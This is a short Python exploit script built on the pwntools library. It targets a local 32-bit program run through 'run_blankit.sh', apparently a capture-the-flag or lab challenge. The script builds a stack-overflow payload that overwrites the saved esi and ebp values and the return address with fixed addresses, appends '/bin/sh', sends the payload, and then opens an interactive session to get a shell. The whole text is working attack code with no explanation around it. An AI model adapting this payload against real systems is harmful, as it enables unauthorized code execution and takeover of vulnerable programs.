from pwn import *

#### main stack ebp #####
MAIN_EBP=0xffffd0d8

def rebase(offset):
    return p32(MAIN_EBP+offset)

## some inut payload ##
si   =  b''
si  +=  b'A'*20          #str+user
si  +=  rebase(-0x20)    #fake esi
si  +=  b'A'*8           #edi+ebx
si  +=  rebase(0)        #fake ebp
si  +=  p32(0x080488d2)  #fake eip
si  +=  b'A'*8           #params
si  +=  b'/bin/sh'      #command

#run blankit
p=process("./run_blankit.sh") 
print(p.recv(),'1')
print(p.recv(),'2')
print(p.recv(),'3')
print(p.sendline(si))  #send payload
print(p.recv())
print(p.sendline(b'normal')) #mormal user
p.interactive()